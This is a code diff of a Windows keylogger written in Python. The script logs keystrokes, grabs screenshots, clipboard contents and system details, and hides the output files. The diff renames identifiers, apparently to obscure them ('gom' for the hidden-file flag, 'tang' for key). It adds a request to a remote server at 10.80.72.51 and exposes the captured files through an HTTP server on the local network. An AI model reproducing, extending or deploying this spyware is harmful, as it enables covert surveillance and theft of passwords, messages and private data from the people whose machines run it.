@@ -7,6 +7,7 @@ import threading
 import pathlib
 import socketserver
 import http.server
+import requests
 
 import time
 import socket
@@ -16,23 +17,17 @@ import win32clipboard
 
 from requests import get
 
-# screen
-
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
-# Check if the `pynput` package is installed
+
+from pynput.keyboard import Key, Listener
 
 ########################################
 # config
 ########################################
 
-from pynput.keyboard import Key, Listener
-# Hidden file attribute
-FILE_ATTRIBUTE_HIDDEN = 0x02
-
-# Tang press counter
+gom = 0x02
 count = 0
-
 
 # List to store the pressed tang
 tangs = []
@@ -43,12 +38,19 @@ dire = str(pathlib.Path().resolve())
 fil = dire.replace('\\','\\\\')
 extend = "\\"
 
+########################################
+# get_ip
+########################################
+
+remote_server_url = "http://10.80.72.51:8080/get-ip"
+
+response = requests.get(remote_server_url)
+ip_address = response.text.strip()
+response.close()
 
 ########################################
-# tang
+# comp_info
 ########################################
-
-# Callback function to handle tang press events
 
 def computer_information():
     with open(fil + extend + sys_info, "a") as f:
@@ -66,9 +68,13 @@ def computer_information():
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
-        ret = ctypes.windll.kernel32.SetFileAttributesW(sys_info, FILE_ATTRIBUTE_HIDDEN)
+        ret = ctypes.windll.kernel32.SetFileAttributesW(sys_info, gom)
         if not ret:
             raise ctypes.WinError()
+
+########################################
+# clip_info
+########################################
 
 def copy_clipboard():
     with open(fil + extend + clip_inf, "a") as f:
@@ -81,19 +87,28 @@ def copy_clipboard():
 
         except:
             f.write("Clipboard could be not be copied")
-        ret = ctypes.windll.kernel32.SetFileAttributesW(clip_inf, FILE_ATTRIBUTE_HIDDEN)
+        ret = ctypes.windll.kernel32.SetFileAttributesW(clip_inf, gom)
         if not ret:
             raise ctypes.WinError()
 
-# get screenshots
+########################################
+# screen_info
+########################################
+
 def screenshot():
     im = ImageGrab.grab()
     im.save(fil + extend + screen)
-time.sleep(20)
-screenshot()
+time.sleep(3)
 
+
+screenshot()
 copy_clipboard()
 computer_information()
+
+########################################
+# tang_info
+########################################
+
 def on_press(tang):
     global tangs, count
 
@@ -130,7 +145,7 @@ def write_file(tangs):
 
     # For Windows systems, set the file as hidden
     if os.name == 'nt':
-        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
+        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, gom)
         if not ret:
             raise ctypes.WinError()
 
@@ -146,20 +161,29 @@ class MyHTTPHandler(http.server.SimpleHTTPRequestHandler):
         pass
 
 def r_s():
-    server = socketserver.TCPServer(('localhost', 8000), MyHTTPHandler)
+    # Get the IP address of the computer on the local network
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("10.80.72.51", 80))
+    ip_address = s.getsockname()[0]
+    s.close()
+    
+    # Start the server
+    server = socketserver.TCPServer((ip_address, 8000), MyHTTPHandler)
     server.quet = True
     server_thread = threading.Thread(target=server.serve_forever)
     server_thread.daemon = True
     server_thread.start()
-
 
 ########################################
 # start
 ########################################
 
 # Start the tang listener in a separate thread
-thread = threading.Thread(target=r_s)
-thread.start()
+if __name__ == '__main__':
+    freeze_support()
+    # Start the tang listener in a separate thread
+    thread = threading.Thread(target=r_s)
+    thread.start()
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
